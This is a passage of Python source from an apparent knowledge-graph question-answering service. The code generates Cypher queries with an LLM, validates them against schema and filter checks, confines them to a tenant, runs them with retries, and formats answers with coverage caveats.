                        "Cypher query. You MUST output a VALID, non-empty Cypher "
                        "query in the `cypher` field, using the exact type/"
                        "attribute names from the ontology schema above. Never "
                        "return an empty string."
                    )
                elif last_was_enum_filter_mismatch:
                    error_feedback = last_error
                elif attempt > 0 and last_error:
                    error_feedback = (
                        f"The previous query failed with: {last_error}\n"
                        f"Query was: {cypher}\n"
                        "Please fix the Cypher and try again. Keep "
                        "$tenant_id / $kg parameters; do not hardcode scope."
                    )

                gen = await self._try_llm_cypher(
                    question,
                    ontology,
                    tenant_id=tenant_id,
                    kg_name=kg_name,
                    examples_text=examples_text,
                    error_feedback=error_feedback,
                    grounding_text=grounding_text,
                    **gen_recovery,
                )

                last_was_length_truncated = False
                last_was_enum_filter_mismatch = False
                last_was_empty_query = False

                if gen is None:
                    last_error = last_error or "no generator produced Cypher"
                    last_was_empty_query = True
                    continue

                # Token instrumentation
                usage_blob = pop_attached_usage(gen)
                if usage_blob is not None:
                    token_ledger.record(
                        stage=stage_for_attempt(attempt),
                        attempt=attempt,
                        model=str(usage_blob.get("model") or self._query_model or ""),
                        provider=str(
                            usage_blob.get("provider")
                            or self._query_provider
                            or ""
                        ),
                        prompt_tokens=usage_blob.get("prompt_tokens"),
                        completion_tokens=usage_blob.get("completion_tokens"),
                        total_tokens=usage_blob.get("total_tokens"),
                    )

                last_gen = gen
                cypher_raw = gen.get("cypher") or gen.get("sparql") or ""
                params = dict(gen.get("params") or {})
                # Hard-bind money leaf so "cost"/"price" cannot execute as bare
                # $cost_prop with wrong name → high-conf empty sum.
                if money_leaf_bound:
                    try:
                        from infona_client.nlp.ask_process_log import (
                            apply_money_leaf_params,
                            log_ask_event,
                        )

                        before = dict(params)
                        params = apply_money_leaf_params(
                            params,
                            money_leaf=money_leaf_bound,
                            money_cue=money_cue_bound,
                        )
                        timing["money_leaf_hard_bound"] = money_leaf_bound
                        log_ask_event(
                            "ask_gen_attempt",
                            attempt=attempt,
                            question=question,
                            tenant_id=tenant_id,
                            kg=kg_name,
                            cypher=cypher_raw,
                            params_before=before,
                            params_after=params,
                            explanation=explanation,
                            money_leaf_bound=money_leaf_bound,
                            template=gen.get("template"),
                        )
                    except Exception:
                        from infona_client.nlp.ask_process_log import (
                            apply_money_leaf_params,
                        )

                        params = apply_money_leaf_params(
                            params,
                            money_leaf=money_leaf_bound,
                            money_cue=money_cue_bound,
                        )
                        timing["money_leaf_hard_bound"] = money_leaf_bound
                else:
                    try:
                        from infona_client.nlp.ask_process_log import log_ask_event

                        log_ask_event(
                            "ask_gen_attempt",
                            attempt=attempt,
                            question=question,
                            tenant_id=tenant_id,
                            kg=kg_name,
                            cypher=cypher_raw,
                            params=params,
                            explanation=gen.get("explanation") or "",
                            template=gen.get("template"),
                        )
                    except Exception:
                        pass
                last_params = params
                explanation = gen.get("explanation") or explanation
                functions_needed = gen.get("functions_needed") or functions_needed

                if gen.get("stub") or gen.get("fixture"):
                    timing["cypher_stub"] = 1.0
                else:
                    timing["cypher_stub"] = 0.0

                if not str(cypher_raw).strip():
                    last_error = "Empty query"
                    last_was_empty_query = True
                    continue

                # Alias leaf rewrite for property keys (old name → new name).
                # Rewrite-only when a non-empty map was fetched; empty map is a
                # no-op and costs nothing beyond the (flag-gated) fetch.
                if alias_map:
                    cypher_raw = self._rewrite_cypher_alias_leaves(cypher_raw, alias_map)

                if store is None:
                    return NLResult(
                        answer=(
                            "Could not answer: Neo4j GraphStore is not configured "
                            "(set INFONA_GRAPH_BACKEND=neo4j and inject a store)."
                        ),
                        sparql=cypher_raw,
                        explanation=explanation,
                        ontology=ontology,
                        timing={
                            **timing,
                            "total_ms": round((time.time() - t0) * 1000, 1),
                        },
                        token_usage=token_ledger.to_list(),
                    )

                # Forbidden Assertion shapes
                forbidden = _cypher_uses_forbidden_shapes(cypher_raw)
                if forbidden and not (gen.get("stub") or gen.get("fixture")):
                    last_error = forbidden
                    if attempt < max_attempts - 1:
                        last_was_enum_filter_mismatch = True  # reuse custom feedback arm
                        last_error = (
                            f"FORBIDDEN shape: {forbidden}\n"
                            f"Query was: {cypher_raw}\n"
                            "Rewrite using MATCH (e:Entity {tenant_id:$tenant_id, kg:$kg})"
                            "-[:INSTANCE_OF]->(c:Class) and OPTIONAL MATCH "
                            "(a:Assertion {subject_id:e.id})-[:PREDICATE]->(p:Property). "
                            "NEVER use HAS_ASSERTION, predicate_key, or Assertion.prop_key."
                        )
                        timing["cypher_forbidden_shape"] = 1.0
                        continue
                    timing.update(token_ledger.totals_for_timing())
                    return NLResult(
                        answer=f"Could not answer: generated Cypher {forbidden}",
                        sparql=cypher_raw,
                        explanation=explanation,
                        ontology=ontology,
                        timing={
                            **timing,
                            "total_ms": round((time.time() - t0) * 1000, 1),
                            "attempts": attempt + 1,
                            "cypher_forbidden_shape": 1.0,
                        },
                        token_usage=token_ledger.to_list(),
                    )

                # Filter integrity + schema predicates + constraint coverage
                # (silent unfiltered totals / invented hops / filter-miss).
                # Always-LLM still applies — we only regenerate, never
                # fixture-short-circuit. Fixtures/stubs skip integrity/schema
                # (template bodies known-good); coverage still runs so
                # measure-only aggregate under filter intent fails closed.
                if not (gen.get("stub") or gen.get("fixture")):
                    from infona_client.nlp.cypher_filter_integrity import (
                        check_cypher_filter_integrity,
                        filter_integrity_feedback,
                    )
                    from infona_client.nlp.query_constraint_coverage import (
                        check_constraint_coverage,
                        coverage_feedback,
                        fail_closed_answer,
                    )
                    from infona_client.nlp.schema_valid_cypher import (
                        check_schema_valid_cypher,
                        fail_closed_schema_answer,
                        schema_valid_feedback,
                    )

                    filt_reason = check_cypher_filter_integrity(
                        cypher_raw,
                        question=question,
                        template=gen.get("template"),
                        params=params,
                    )
                    if filt_reason:
                        last_error = filter_integrity_feedback(
                            filt_reason, previous_cypher=cypher_raw
                        )
                        cov_fail = check_constraint_coverage(
                            question,
                            cypher_raw,
                            params=params,
                            template=gen.get("template"),
                            integrity_reason=filt_reason,
                            dim_binds=dim_binds,
                            populated_types=populated_types_for_coverage,
                        )
                        timing.update(cov_fail.to_timing())
                        if attempt < max_attempts - 1:
                            last_was_enum_filter_mismatch = True
                            timing["cypher_filter_integrity_retry"] = 1.0
                            logger.info(
                                "cypher_filter_integrity_retry",
                                reason=filt_reason[:200],
                                question=question,
                                attempt=attempt,
                            )
                            continue
                        timing.update(token_ledger.totals_for_timing())
                        return NLResult(
                            answer=(
                                "Could not answer: generated Cypher would apply "
                                "filters incorrectly (OPTIONAL MATCH value filter "
                                "does not constrain results). Fail closed rather "
                                "than return a silent unfiltered total."
                            ),
                            sparql=cypher_raw,
                            explanation=explanation,
                            ontology=ontology,
                            timing={
                                **timing,
                                "total_ms": round((time.time() - t0) * 1000, 1),
                                "attempts": attempt + 1,
                                "cypher_filter_integrity_reject": 1.0,
                            },
                            token_usage=token_ledger.to_list(),
                            query_confidence=cov_fail.confidence,
                            query_confidence_reason=cov_fail.reason,
                            clarification_prompt=cov_fail.clarification_prompt,
                        )

                    # Schema-valid predicates: free-form must not invent
                    # relationship types / attr leaves (HAS_OFFERED_IN vs
                    # offered_in → OFFERED_IN). Prefer precomputed GraphStore
                    # inventory (catalog + populated leaves); ontology text
                    # only when store probe failed. Post-gen gate only.
                    schema_res = check_schema_valid_cypher(
                        cypher_raw,
                        ontology or "",
                        params=params,
                        template=gen.get("template"),
                        inventory=schema_inventory,
                    )
                    timing.update(schema_res.to_timing())
                    if not schema_res.ok:
                        last_error = schema_valid_feedback(
                            schema_res, previous_cypher=cypher_raw
                        )
                        cov_schema = check_constraint_coverage(
                            question,
                            cypher_raw,
                            params=params,
                            template=gen.get("template"),
                            schema_reason=schema_res.reason,
                            dim_binds=dim_binds,
                            populated_types=populated_types_for_coverage,
                        )
                        timing.update(cov_schema.to_timing())
                        if attempt < max_attempts - 1:
                            last_was_enum_filter_mismatch = True
                            timing["schema_valid_cypher_retry"] = 1.0
                            logger.info(
                                "schema_valid_cypher_retry",
                                reason=(schema_res.reason or "")[:200],
                                invented_rels=list(schema_res.invented_rel_types)[:8],
                                invented_props=list(schema_res.invented_prop_keys)[:8],
                                question=question,
                                attempt=attempt,
                            )
                            continue
                        timing.update(token_ledger.totals_for_timing())
                        return NLResult(
                            answer=fail_closed_schema_answer(schema_res),
                            sparql=cypher_raw,
                            explanation=explanation,
                            ontology=ontology,
                            timing={
                                **timing,
                                "total_ms": round((time.time() - t0) * 1000, 1),
                                "attempts": attempt + 1,
                                "schema_valid_cypher_reject": 1.0,
                            },
                            token_usage=token_ledger.to_list(),
                            query_confidence=cov_schema.confidence,
                            query_confidence_reason=cov_schema.reason
                            or schema_res.reason,
                            clarification_prompt=cov_schema.clarification_prompt,
                        )

                    cov = check_constraint_coverage(
                        question,
                        cypher_raw,
                        params=params,
                        template=gen.get("template"),
                        dim_binds=dim_binds,
                        populated_types=populated_types_for_coverage,
                    )
                    timing.update(cov.to_timing())
                    if not cov.ok and cov.fail_closed:
                        last_error = coverage_feedback(
                            cov, previous_cypher=cypher_raw
                        )
                        if attempt < max_attempts - 1:
                            last_was_enum_filter_mismatch = True
                            timing["query_constraint_coverage_retry"] = 1.0
                            if cov.empty_plan_types:
                                timing["query_zero_instance_type_retry"] = 1.0
                            logger.info(
                                "query_constraint_coverage_retry",
                                reason=(cov.reason or "")[:200],
                                unbound=list(cov.unbound_tokens)[:8],
                                empty_plan_types=list(cov.empty_plan_types)[:8],
                                question=question,
                                attempt=attempt,
                            )
                            continue
                        timing.update(token_ledger.totals_for_timing())
                        return NLResult(
                            answer=fail_closed_answer(cov),
                            sparql=cypher_raw,
                            explanation=explanation,
                            ontology=ontology,
                            timing={
                                **timing,
                                "total_ms": round((time.time() - t0) * 1000, 1),
                                "attempts": attempt + 1,
                                "query_constraint_coverage_reject": 1.0,
                            },
                            token_usage=token_ledger.to_list(),
                            query_confidence=cov.confidence,
                            query_confidence_reason=cov.reason,
                            clarification_prompt=cov.clarification_prompt,
                        )
                    # Stash last good coverage for the success NLResult.
                    last_gen["_coverage"] = cov

                try:
                    cypher, forced_params = confine_generated_cypher(
                        cypher_raw,
                        tenant_id=tenant_id,
                        kg=kg_name,
                        params=params,
                    )
                except CrossTenantCypherError:
                    raise
                except CypherScopeError as exc:
                    last_error = exc.detail
                    if attempt < max_attempts - 1 and not (
                        gen.get("stub") or gen.get("fixture")
                    ):
                        timing["cypher_scope_error"] = 1.0
                        continue
                    timing.update(token_ledger.totals_for_timing())
                    return NLResult(
                        answer=f"Could not answer: {exc.detail}",
                        sparql=cypher_raw,
                        explanation=explanation,
                        ontology=ontology,
                        timing={
                            **timing,
                            "total_ms": round((time.time() - t0) * 1000, 1),
                            "cypher_scope_error": 1.0,
                            "attempts": attempt + 1,
                        },
                        token_usage=token_ledger.to_list(),
                    )

                t_exec = time.time()
                try:
                    session = store.session(
                        GraphScope.for_instance(tenant_id, kg_name)
                    )
                    records, exec_path = await self._execute_confined_cypher(
                        session, gen, cypher, forced_params
                    )
                    timing["cypher_exec_path"] = exec_path
                    timing[
                        f"neptune_exec_ms{f'_retry{attempt}' if attempt > 0 else ''}"
                    ] = round((time.time() - t_exec) * 1000, 1)
                except GraphQueryError as exc:
                    scrubbed = scrub_cypher_error(str(exc))
                    last_error = scrubbed
                    timing[
                        f"neptune_exec_ms{f'_retry{attempt}' if attempt > 0 else ''}"
                    ] = round((time.time() - t_exec) * 1000, 1)
                    if attempt >= max_attempts - 1:
                        timing.update(token_ledger.totals_for_timing())
                        return NLResult(
                            answer=f"Could not answer: {scrubbed}",
                            sparql=cypher,
                            explanation=explanation,
                            ontology=ontology,
                            timing={
                                **timing,
                                "total_ms": round((time.time() - t0) * 1000, 1),
                                "attempts": attempt + 1,
                            },
                            token_usage=token_ledger.to_list(),
                        )
                    timing["cypher_retry"] = 1.0
                    continue

                variables, bindings = records_to_bindings(records)

                # Zero-row recovery: enum mismatch / ontology escalation / honest empty
                if not bindings and attempt < max_attempts - 1:
                    try:
                        from infona_client.nlp.enum_filter import (
                            enum_mismatch_feedback,
                            impossible_enum_contains,
                        )

                        # Works when the query still carries SPARQL-shaped FILTERs
                        # or type URIs; no-op on pure template Cypher.
                        mismatches = impossible_enum_contains(cypher, ontology)
                        if mismatches:
                            last_error = enum_mismatch_feedback(
                                mismatches, previous_sparql=cypher
                            )
                            last_was_enum_filter_mismatch = True
                            timing["enum_filter_mismatch_retry"] = 1.0
                            timing["enum_filter_mismatches"] = float(len(mismatches))
                            logger.info(
                                "enum_filter_mismatch_retry",
                                count=len(mismatches),
                                question=question,
                            )
                            continue
                    except Exception:
                        logger.debug(
                            "enum_filter_mismatch_check_failed", exc_info=True
                        )

                    if not full_ontology_loaded and ontology_source == "semantic":
                        from infona_client.nlp.empty_type_guard import (
                            empty_declared_types,
                            honest_empty_targets,
                            zero_row_escalation_feedback,
                        )

                        honest = honest_empty_targets(
                            question, cypher, ontology, params=forced_params
                        )
                        full_ontology = ""
                        if not honest:
                            try:
                                full_ontology = await self._fetch_ontology(
                                    graph_uri,
                                    data_graph,
                                    layer_graph_uris=layer_graph_uris,
                                )
                            except Exception:
                                logger.debug(
                                    "ontology_zero_row_escalation_failed",
                                    exc_info=True,
                                )
                                full_ontology_loaded = True
                        full_ontology_usable = bool(
                            full_ontology
                            and full_ontology.strip()
                            and full_ontology
                            not in (ONTOLOGY_FETCH_ERROR, ONTOLOGY_EMPTY)
                        )
                        if full_ontology_usable and not honest:
                            honest = honest_empty_targets(
                                question,
                                cypher,
                                full_ontology,
                                params=forced_params,
                            )
                        if honest:
                            names = ", ".join(sorted(honest))
                            timing["zero_row_honest_empty"] = 1.0
                            timing["zero_row_honest_empty_types"] = names
                            honest_empty_note = (
                                f"\n\nNote: {names} "
                                f"{'is' if len(honest) == 1 else 'are'} declared in the "
                                "ontology but currently ha"
                                f"{'s' if len(honest) == 1 else 've'} no instances in "
                                "this knowledge graph."
                            )
                            logger.info(
                                "zero_row_honest_empty",
                                types=sorted(honest),
                                question=question,
                            )
                            full_ontology_loaded = (
                                full_ontology_loaded or full_ontology_usable
                            )
                        elif full_ontology_usable:
                            ontology = full_ontology
                            ontology_source = "full"
                            timing["ontology_escalated_to_full_attempt"] = attempt + 1
                            timing["ontology_zero_row_escalation"] = 1.0
                            last_was_enum_filter_mismatch = True
                            last_error = zero_row_escalation_feedback(
                                bool(empty_declared_types(full_ontology))
                            )
                            full_ontology_loaded = True
                            logger.info(
                                "ontology_zero_row_escalation",
                                question=question,
                                attempt=attempt,
                            )
                            continue

                # Unbound projection honesty
                missing_vars = unbound_projection_vars(variables, bindings)
                if missing_vars:
                    timing["unbound_projection_vars"] = ", ".join(missing_vars)
                    logger.info(
                        "unbound_projection_vars",
                        vars=missing_vars,
                        question=question,
                    )

                # ONTA-454 KG coverage caveat
                kg_coverage_note = ""
                if bindings:
                    # Prefer type names from the executed gen when Cypher has no
                    # SPARQL type IRIs for referenced_types().
                    kg_coverage_note = await self._kg_coverage_caveat(
                        cypher,
                        ontology,
                        data_graph,
                        graph_uri,
                        layer_graph_uris,
                        kg_declared_names,
                        kg_active_types,
                        ontology_source
                        if ontology_source in ("semantic", "full")
                        else "full",
                        timing,
                        query_params=forced_params,
                    )

                answer = await self._format_answer(
                    bindings,
                    explanation,
                    missing_vars=missing_vars,
                    data_graph=data_graph,
                )
                answer += honest_empty_note
                if kg_coverage_note:
                    answer += f"\n\nCoverage note: {kg_coverage_note}"

                t_reph = time.time()
                narrative_answer = await self._rephrase_via_openrouter(
                    question, bindings
                )
                rephrase_usage = getattr(self, "_last_rephrase_usage", None)
                self._last_rephrase_usage = None
                if rephrase_usage:
                    token_ledger.record(
                        stage=STAGE_REPHRASE,
                        attempt=attempt,
                        model=str(rephrase_usage.get("model") or ""),
                        provider=str(
                            rephrase_usage.get("provider") or "openrouter"
                        ),
                        prompt_tokens=rephrase_usage.get("prompt_tokens"),
                        completion_tokens=rephrase_usage.get("completion_tokens"),
                        total_tokens=rephrase_usage.get("total_tokens"),
                    )
                if honest_empty_note and narrative_answer:
                    narrative_answer += honest_empty_note
                if kg_coverage_note and narrative_answer:
                    narrative_answer += f"\n\nCoverage note: {kg_coverage_note}"
                timing["rephrase_ms"] = round((time.time() - t_reph) * 1000, 1)

                citations = []
                coverage_caveat = ""
                run_coverage = (
                    run_manifest.coverage()
                    if hasattr(run_manifest, "coverage")
                    else run_manifest
                )
                if self._answer_citations_enabled:
                    from infona_client.nlp.answer_meta import (
                        build_citations,
                        build_coverage_caveat,
                    )

                    citations = await build_citations(
                        self.neptune, data_graph, variables, bindings
                    )
                    stale_count = sum(1 for c in citations if not c.is_current)
                    coverage_caveat = build_coverage_caveat(
                        run_coverage,
                        stale_count=stale_count,
                        total_cited=len(citations),
                    )
                    if citations:
                        timing["citations"] = len(citations)
                elif run_coverage is not None:
                    from infona_client.nlp.answer_meta import build_coverage_caveat

                    coverage_caveat = build_coverage_caveat(run_coverage)
                if kg_coverage_note:
                    coverage_caveat = "; ".join(
                        p for p in (kg_coverage_note, coverage_caveat) if p
                    )

                timing["total_ms"] = round((time.time() - t0) * 1000, 1)
                timing["attempts"] = attempt + 1
                timing["rows"] = len(bindings)
                timing.update(token_ledger.totals_for_timing())
                cov_ok = last_gen.get("_coverage")
                q_conf = ""
                q_conf_reason = ""
                q_clarify = ""
                if cov_ok is not None:
                    try:
                        timing.update(cov_ok.to_timing())
                        q_conf = cov_ok.confidence
                        q_conf_reason = cov_ok.reason or ""
                        q_clarify = cov_ok.clarification_prompt or ""
                    except Exception:
                        pass
                try:
                    from infona_client.nlp.ask_process_log import log_ask_event

                    log_ask_event(
                        "ask_result",
                        question=question,
                        tenant_id=tenant_id,
                        kg=kg_name,
                        answer=(answer or "")[:1500],
                        cypher=cypher,
                        params=last_params,
                        rows=len(bindings),
                        query_confidence=q_conf,
                        query_confidence_reason=q_conf_reason,
                        money_leaf_bound=money_leaf_bound,
                        timing={
                            k: timing.get(k)
                            for k in (
                                "query_probe",
                                "money_leaf_top",
                                "money_leaf_hard_bound",
                                "numeric_grounding_prop",
                                "dim_values_present",
                                "query_confidence",
                                "attempts",
                                "total_ms",
                                "ontology_type_names",
                                "semantic_type_names",
                                "populated_type_names",
                                "ontology_semantic_ignored",
                            )
                            if k in timing
                        },
                    )
                except Exception:
                    pass
                return NLResult(
                    answer=answer,
                    sparql=cypher,
                    explanation=explanation,
                    ontology=ontology,
                    narrative_answer=narrative_answer,
                    functions_invoked=functions_needed,
                    timing=timing,
                    citations=citations,
                    coverage_caveat=coverage_caveat,
                    token_usage=token_ledger.to_list(),
                    query_confidence=q_conf,
                    query_confidence_reason=q_conf_reason,
                    clarification_prompt=q_clarify,
                )

            except (CrossTenantQueryError, CrossTenantCypherError):
                # ONTA-424 / ONTA-530: foreign-graph / cross-tenant is a security
                # event, not a syntax slip. Never fold into last_error (which
                # surfaces in the degraded answer and is fed back to the model),
                # never retry. Propagate to api/routes/ask.py which returns the
                # generic "internal error" NLResult with no query / no foreign
                # graph URI in the body.
                raise
            except EmptyLLMResponse as e:
                last_error = str(e)
                last_was_empty_query = True
                last_was_length_truncated = e.finish_reason == "length"
                logger.warning(
                    "ask_cypher_attempt_failed",
                    attempt=attempt,
                    error=last_error,
                    question=question,
                )
                continue
            except Exception as e:
                last_error = str(e)
                last_was_empty_query = not (cypher or "").strip()
                last_was_length_truncated = (
                    isinstance(e, EmptyLLMResponse) and e.finish_reason == "length"
                )
                logger.warning(
                    "ask_cypher_attempt_failed",
                    attempt=attempt,
                    error=last_error,
                    question=question,
                )
                continue

        timing["total_ms"] = round((time.time() - t0) * 1000, 1)
        timing["attempts"] = max_attempts
        timing.update(token_ledger.totals_for_timing())
        # Surface last coverage assessment if the retry loop exhausted without
        # a dedicated fail-closed return (e.g. execute errors after a covered plan).
        _final_conf = str(timing.get("query_confidence") or "")
        _final_reason = str(timing.get("query_confidence_reason") or "")
        _final_clarify = str(timing.get("clarification_prompt") or "")
        return NLResult(
            answer=(
                f"Could not answer after {max_attempts} attempts. "
                f"Last error: {last_error}"
            ),
            sparql=cypher,
            explanation=explanation,
            ontology=ontology,
            timing=timing,
            token_usage=token_ledger.to_list(),
            query_confidence=_final_conf,
            query_confidence_reason=_final_reason,
            clarification_prompt=_final_clarify,
        )

    @staticmethod
    def _rewrite_cypher_alias_leaves(cypher: str, alias_map: dict[str, str]) -> str:
        """Rewrite aliased attribute leaf names inside Cypher property access.

        **Rewrite-only when a map is present.** An empty / missing map is a
        no-op (callers already gate on ``if alias_map:``); there is no ontology
        lookup, no registration, and no param mutation here — only textual leaf
        renames on the Cypher string the model (or fixture) produced.

        ``alias_map`` is old_uri → new_uri (from ``fetch_alias_map``). We rewrite
        only the leaf segment of ``attrs/<leaf>`` so ``e.phone_num`` and
        ``p.name = 'phone_num'`` pick up renames. Empty map ⇒ unchanged.
        """
        if not alias_map or not cypher:
            return cypher
        leaf_map: dict[str, str] = {}
        for old, new in alias_map.items():
            old_leaf = old.rsplit("/", 1)[-1]
            new_leaf = new.rsplit("/", 1)[-1]
            if old_leaf and new_leaf and old_leaf != new_leaf:
                leaf_map[old_leaf] = new_leaf
        if not leaf_map:
            return cypher
        # Longer leaves first so phone_num wins over phone.
        for old_leaf in sorted(leaf_map, key=len, reverse=True):
            new_leaf = leaf_map[old_leaf]
            cypher = re.sub(
                rf"(?<![A-Za-z0-9_]){re.escape(old_leaf)}(?![A-Za-z0-9_])",
                new_leaf,
                cypher,
            )
        return cypher

    async def _execute_confined_cypher(
        self,
        session: Any,
        gen: dict,
        cypher: str,
        forced_params: dict,
    ) -> tuple[list, str]:
        """Run confined Cypher: prefer allowlisted template, else execute_read.

        Session already forces tenant/kg; ``forced_params`` must come from
        :func:`confine_generated_cypher`. Never trusts model tenant/kg values.
        """
        from infona_client.graph.schema_bootstrap import TEMPLATES
        from infona_client.graph.store import GraphQueryError

        template = gen.get("template")
        is_fixture = bool(gen.get("stub") or gen.get("fixture"))
        if (
            template
            and isinstance(template, str)
            and template in TEMPLATES
            and not TEMPLATES[template].writing
        ):
            tmpl_params = {
                k: v
                for k, v in forced_params.items()
                if k not in ("tenant_id", "kg")
            }
            for k, v in (gen.get("params") or {}).items():
                if k not in ("tenant_id", "kg") and k not in tmpl_params:
                    tmpl_params[k] = v
            cypher_text = TEMPLATES[template].cypher or ""
            if "$limit" in cypher_text and tmpl_params.get("limit") is None:
                tmpl_params["limit"] = 25
            if "$after_id" in cypher_text and "after_id" not in tmpl_params:
                tmpl_params["after_id"] = None
            missing = _missing_template_params(cypher_text, tmpl_params)
            if not missing:
                records = await session.execute_template(template, tmpl_params)
                return records, f"template:{template}"
            if is_fixture:
                raise GraphQueryError(
                    f"Fixture template {template!r} missing params: {sorted(missing)}"
                )

        if is_fixture and "count(*)" in cypher:
            if "primary_type" in forced_params:
                records = await session.execute_template(
                    "entity_count_by_type",
                    {"primary_type": forced_params["primary_type"]},
                )
                return records, "template:entity_count_by_type"
            records = await session.execute_template("entity_count_total", {})
            return records, "template:entity_count_total"

        records = await session.execute_read(cypher, forced_params)
        return records, "execute_read"

    async def _try_llm_cypher(
        self,
        question: str,
        ontology: str,
        *,
        tenant_id: str,
        kg_name: str,
        examples_text: str = "",
        error_feedback: str = "",
        grounding_text: str = "",
        max_completion_tokens: int | None = None,
        prefer_fallback: bool = False,
    ) -> dict | None:
        """Best-effort LLM Cypher generation.

        Returns ``None`` without API keys. Re-raises :class:`EmptyLLMResponse`
        so the retry loop can apply length-truncation recovery (ONTA-530);
        other generator failures log and return ``None``.

        ``grounding_text`` is optional structured ontology-subgraph context
        (from :func:`~infona_client.nlp.ontology_subgraph_match.ground_ask_plan`)
        injected into the prompt — never a fixture short-circuit.
        """
        if not (
            self._openrouter_key
            or self._cerebras_key
            or getattr(self, "anthropic", None)
        ):
            return None
        if not self._openrouter_key and not self._cerebras_key:
            try:
                key = getattr(self.anthropic, "api_key", None) or ""
            except Exception:
                key = ""
            if not key:
                return None

        prompt = build_cypher_generation_prompt(
            question,
            ontology,
            tenant_id=tenant_id,
            kg_name=kg_name,
            examples_text=examples_text,
            error_feedback=error_feedback,
            grounding_text=grounding_text,
        )
        try:
            if prefer_fallback:
                # Tier-2 length recovery: leave the *reasoning* model for a
                # non-reasoning OpenRouter (or Anthropic) path so think-budget
                # exhaustion does not loop forever on gpt-oss.
                if self._openrouter_key:
                    return await self._generate_cypher_via_openrouter(
                        prompt, prefer_non_reasoning=True
                    )
                if getattr(self, "anthropic", None) is not None:
                    return await self._generate_cypher_via_anthropic(prompt)
            # Happy path: do NOT pass max_completion_tokens so the call is
            # byte-identical when no length recovery is in play (tests pin this).
            cerebras_kw = {}
            if max_completion_tokens is not None:
                cerebras_kw["max_completion_tokens"] = max_completion_tokens
            if self._query_provider == "cerebras" and self._cerebras_key:
                return await self._generate_cypher_via_cerebras(prompt, **cerebras_kw)
            if self._openrouter_key:
                return await self._generate_cypher_via_openrouter(prompt)
            if self._cerebras_key:
                return await self._generate_cypher_via_cerebras(prompt, **cerebras_kw)
            return await self._generate_cypher_via_anthropic(prompt)
        except EmptyLLMResponse:
            raise
        except Exception:
            logger.warning("cypher_llm_generation_failed", exc_info=True)
            return None

    def _openrouter_cypher_model_id(
        self, *, prefer_non_reasoning: bool = False
    ) -> str:
        """Return an OpenRouter-valid model slug for the Cypher path.

        Direct Cerebras uses bare ``gpt-oss-120b``; OpenRouter needs
        ``openai/gpt-oss-120b``. When this method is used as *tier-2*
        length recovery (``prefer_fallback``), prefer a non-reasoning
        OpenRouter model so think-budget exhaustion has an escape hatch.
        """
        if prefer_non_reasoning:
            return os.environ.get(
                "INFONA_QUERY_FALLBACK_MODEL", "google/gemini-2.5-flash"
            )
        model = (self._query_model or "").strip()
        if self._query_provider == "openrouter" and model:
            return model
        # Map bare Cerebras / short slugs onto OpenRouter ids.
        if model in ("gpt-oss-120b", "openai/gpt-oss-120b") or "gpt-oss-120b" in model:
            return "openai/gpt-oss-120b"
        if model.startswith("openai/") or model.startswith("google/") or "/" in model:
            return model
        if model:
            # Unknown bare slug — still try OpenRouter openai/ prefix for oss.
            return f"openai/{model}" if not model.startswith("openai/") else model
        return "openai/gpt-oss-120b"

    async def _generate_cypher_via_openrouter(
        self, prompt: str, *, prefer_non_reasoning: bool = False
    ) -> dict:
        openrouter_url = f"{OPENROUTER_BASE}/chat/completions"
        assert_online_url(openrouter_url, purpose="query Cypher LLM (openrouter)")
        model = self._openrouter_cypher_model_id(
            prefer_non_reasoning=prefer_non_reasoning
        )
        body: dict = {
            "model": model,
            "messages": [
                {"role": "system", "content": CYPHER_GENERATION_SYSTEM},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0,
            "response_format": {"type": "json_object"},
        }
        # Reasoning models (gpt-oss-120b etc.) need a large output budget so
        # chain-of-thought does not starve the JSON answer.
        if _is_reasoning_query_model(model):
            body["max_tokens"] = OPENROUTER_REASONING_MAX_TOKENS
            # Prefer Cerebras for openai/gpt-oss-* when OpenRouter hosts it
            # (thinking model + high throughput). Fallbacks allowed.
            if "gpt-oss" in model.lower():
                body["provider"] = {
                    "order": ["Cerebras"],
                    "allow_fallbacks": True,
                }
        timeout_s = (
            OPENROUTER_QUERY_TIMEOUT_S
            if _is_reasoning_query_model(model)
            else 60.0
        )
        async with httpx.AsyncClient(timeout=timeout_s) as client:
            res = await client.post(
                openrouter_url,
                headers={
                    "Authorization": f"Bearer {self._openrouter_key}",
                    "Content-Type": "application/json",
                },
                json=body,
            )
            res.raise_for_status()
            data = res.json()
            content = _require_message_content(data, "openrouter")
            # Reasoning models sometimes wrap JSON in fences or prefix prose.
            if isinstance(content, str):
                stripped = content.strip()
                if stripped.startswith("```"):
                    lines = [
                        ln
                        for ln in stripped.split("\n")
                        if not ln.strip().startswith("```")
                    ]
                    stripped = "\n".join(lines)
                # Salvage first JSON object if model emitted think-text first.
                if stripped and not stripped.lstrip().startswith("{"):
                    brace = stripped.find("{")
                    if brace >= 0:
                        stripped = stripped[brace:]
                parsed = json.loads(stripped)
            else:
                parsed = content
            if "cypher" not in parsed and "sparql" in parsed:
                parsed["cypher"] = parsed["sparql"]
            return attach_usage(
                parsed,
                usage=data.get("usage") if isinstance(data, dict) else None,
                model=model,
                provider="openrouter",
                response_model=(data.get("model") if isinstance(data, dict) else None)
                or "",
            )

    async def _generate_cypher_via_cerebras(
        self, prompt: str, max_completion_tokens: int = 2048
    ) -> dict:
        cerebras_url = "https://api.cerebras.ai/v1/chat/completions"
        assert_online_url(cerebras_url, purpose="query Cypher LLM (cerebras)")
        async with httpx.AsyncClient(timeout=30) as client:
            res = await client.post(
                cerebras_url,
                headers={
                    "Authorization": f"Bearer {self._cerebras_key}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": self._query_model,
                    "messages": [
                        {"role": "system", "content": CYPHER_GENERATION_SYSTEM},
                        {"role": "user", "content": prompt},
                    ],
                    "max_completion_tokens": max_completion_tokens,
                    "temperature": 0,
                    "response_format": {
                        "type": "json_schema",
                        "json_schema": {
                            "name": "cypher_response",
                            "strict": True,
                            "schema": {
                                "type": "object",
                                "properties": {
                                    "cypher": {"type": "string"},
                                    "params": {
                                        "type": "object",
                                        "additionalProperties": True,
                                    },
                                    "explanation": {"type": "string"},
                                    "functions_needed": {
                                        "type": "array",
                                        "items": {"type": "string"},
                                    },
                                },
                                "required": [
                                    "cypher",
                                    "explanation",
                                    "functions_needed",
                                ],
                                "additionalProperties": False,
                            },
                        },
                    },
                },
            )
            res.raise_for_status()
            data = res.json()
            content = _require_message_content(data, "cerebras")
            parsed = json.loads(content) if isinstance(content, str) else content
            if "cypher" not in parsed and "sparql" in parsed:
                parsed["cypher"] = parsed["sparql"]
            return attach_usage(
                parsed,
                usage=data.get("usage") if isinstance(data, dict) else None,
